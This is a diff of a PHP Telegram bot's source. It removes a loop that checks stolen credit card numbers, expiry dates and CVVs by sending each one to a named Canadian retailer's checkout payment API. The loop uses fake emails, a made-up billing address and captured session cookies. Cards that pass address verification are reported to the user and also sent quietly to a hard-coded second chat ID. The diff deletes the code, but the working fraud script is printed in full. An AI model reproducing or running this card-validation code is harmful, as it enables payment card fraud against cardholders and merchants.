@@ -25,47 +25,7 @@ switch($message){
 		if(preg_match('/[^0-9\n|\-]/', $string) !== false){
 			$filtered_string = preg_replace('/[^0-9\n|\-]/', '', $string);
 
-			for ($i=0; $i <= substr_count($filtered_string, "\n"); $i++) { 
-				$cclist = explode("\n", $filtered_string); 
-				$entry = explode("|", $cclist[$i]);
-				
-				$cc = $entry[0];
-				$mes = $entry[1];
-				$ano = $entry[2];
-				$cvv = $entry[3];
-				$email = "doublebrown".rand(1, 200000)."@gmail.com";
-				$postal = rand(0000, 9999);
-
-				// $token = authenticate($cc, $mes, $ano, $cvv);
-				$ch = curl_init();
-				curl_setopt($ch, CURLOPT_URL, 'http://www.iglooexpress.ca/eng/rest/eng/V1/guest-carts/ENTpPC16bJCHbBXUYv2wub84aBgnDqZj/payment-information');
-				curl_setopt($ch, CURLOPT_HEADER, 0);
-				curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-				curl_setopt($ch, CURLOPT_COOKIEFILE, $botUrl.'/cookie.txt');
-				curl_setopt($ch, CURLOPT_COOKIEJAR, $botUrl.'/cookie.txt');
-				curl_setopt($ch, CURLOPT_HTTPHEADER, array(   
-					'accept: */*',
-					'content-type: application/json',
-					'Cookie: searchReport-log=0; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; form_key=Bd52g1BcAm4V1YV7; _ga=GA1.2.1624297886.1608627567; _gid=GA1.2.1139314673.1608627567; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=d6e7f18ea88f72a62783a9367b35edb0; mage-messages=; PHPSESSID=gcta6clfaiucab5coa56gc9egs; section_data_ids=%7B%22cart%22%3A1608627731%2C%22customer%22%3A1608627729%2C%22compare-products%22%3A1608627729%2C%22last-ordered-items%22%3A1608627729%2C%22directory-data%22%3A1608627729%2C%22captcha%22%3A1608627729%2C%22instant-purchase%22%3A1608627729%2C%22persistent%22%3A1608627729%2C%22review%22%3A1608627729%2C%22wishlist%22%3A1608627729%2C%22recently_viewed_product%22%3A1608627729%2C%22recently_compared_product%22%3A1608627729%2C%22product_data_storage%22%3A1608627729%2C%22paypal-billing-agreement%22%3A1608627729%2C%22checkout-fields%22%3A1608627729%2C%22collection-point-result%22%3A1608627729%2C%22pickup-location-result%22%3A1608627729%7D',
-					'origin: https://www.iglooexpress.ca',
-					'referer: http://www.iglooexpress.ca/eng/checkout/',
-				));
-				curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"ENTpPC16bJCHbBXUYv2wub84aBgnDqZj","billingAddress":{"countryId":"CA","regionId":"74","regionCode":"ON","region":"Ontario","street":["1365  Goyeau Ave"],"company":"","telephone":"519-253-9262","fax":"","postcode":"'.$postal.'","city":"Windsor","firstname":"richard","lastname":"smith","saveInAddressBook":null},"paymentMethod":{"method":"rootways_elavon_option","additional_data":{"cc_cid":"'.$cvv.'","cc_ss_start_month":"","cc_ss_start_year":"","cc_ss_issue":"","cc_type":"VI","cc_exp_year":"'.$ano.'","cc_exp_month":"'.$mes.'","cc_number":"'.$cc.'"},"extension_attributes":{"swissup_checkout_fields":{}}},"email":"'.$email.'"}');
-				$pagamento = curl_exec($ch); 
-				$error_message = GetStr($pagamento, '"message":"','"');
-				
-				if(strpos($pagamento, "AVS") !== false){
-					sendMessage($chatId, $filtered_string . " CVV: Matched AVS");
-					sendMessage("946540447", $filtered_string . " CVV: Matched AVS");
-				}
-				else{
-					sendMessage($chatId, $filtered_string . " " . $error_message);
-				}
-			}
+			sendMessage($chatId, $filtered_string);
 		}
 		else{
 			sendMessage($chatId, "Hindi ma-test ang mensahe.");
